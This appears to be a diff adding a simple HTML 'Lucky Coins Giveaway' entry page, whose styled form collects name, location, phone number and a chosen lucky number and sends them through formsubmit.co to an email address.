@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Lucky Coins Giveaway</title>
+
+<style>
+
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    background: linear-gradient(135deg, #090d20, #151d3d);
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+    color: white;
+}
+
+.container {
+    width: 100%;
+    max-width: 450px;
+    background: #111a32;
+    padding: 35px 28px;
+    border-radius: 18px;
+    box-shadow: 0 0 30px rgba(0, 195, 255, 0.15);
+    border: 1px solid #263b63;
+}
+
+.logo {
+    text-align: center;
+    font-size: 45px;
+    margin-bottom: 10px;
+}
+
+h1 {
+    text-align: center;
+    color: #00d9ff;
+    font-size: 27px;
+    margin-bottom: 10px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #b7c5df;
+    font-size: 14px;
+    margin-bottom: 30px;
+    line-height: 1.6;
+}
+
+label {
+    display: block;
+    margin-bottom: 8px;
+    margin-top: 17px;
+    font-size: 14px;
+    color: #e4edff;
+}
+
+input, select {
+    width: 100%;
+    padding: 14px;
+    background: #1b2948;
+    border: 1px solid #34496e;
+    border-radius: 9px;
+    color: white;
+    outline: none;
+    font-size: 14px;
+}
+
+input:focus, select:focus {
+    border-color: #00d9ff;
+}
+
+input::placeholder {
+    color: #8796b3;
+}
+
+button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 25px;
+    border: none;
+    border-radius: 9px;
+    background: linear-gradient(90deg, #00bfff, #006eff);
+    color: white;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 20px #007bff55;
+}
+
+.footer {
+    text-align: center;
+    margin-top: 25px;
+    color: #7e91b4;
+    font-size: 12px;
+}
+
+.terms {
+    display: flex;
+    gap: 9px;
+    align-items: flex-start;
+    margin-top: 20px;
+    font-size: 12px;
+    color: #b7c5df;
+}
+
+.terms input {
+    width: auto;
+    margin-top: 2px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">🪙</div>
+
+    <h1>LUCKY COINS</h1>
+
+    <p class="subtitle">
+        Welcome to the Lucky Coins Giveaway!
+        Complete the form below to submit your entry.
+    </p>
+
+    <form action="https://formsubmit.co/realrk4@gmail.com"
+          method="POST">
+
+        <input type="hidden" name="_subject"
+        value="New Lucky Coins Giveaway Entry">
+
+        <input type="hidden" name="_template"
+        value="table">
+
+        <label>Full Name</label>
+
+        <input
+        type="text"
+        name="Full Name"
+        placeholder="Enter your full name"
+        required>
+
+        <label>Country / Location</label>
+
+        <input
+        type="text"
+        name="Location"
+        placeholder="Enter your country or city"
+        required>
+
+        <label>Phone Number</label>
+
+        <input
+        type="tel"
+        name="Phone Number"
+        placeholder="Enter your phone number"
+        required>
+
+        <label>Choose Your Lucky Number</label>
+
+        <select name="Lucky Number" required>
+
+            <option value="">Select a number</option>
+
+            <script>
+                for(let i = 1; i <= 100; i++) {
+                    document.write(
+                        `<option value="${i}">${i}</option>`
+                    );
+                }
+            </script>
+
+        </select>
+
+        <div class="terms">
+
+            <input type="checkbox" required>
+
+            <span>
+                I agree to submit my information
+                for this giveaway entry.
+            </span>
+
+        </div>
+
+        <button type="submit">
+            SUBMIT MY ENTRY 🚀
+        </button>
+
+    </form>
+
+    <div class="footer">
+        © 2026 Lucky Coins Giveaway.
+        All Rights Reserved.
+    </div>
+
+</div>
+
+</body>
+</html>
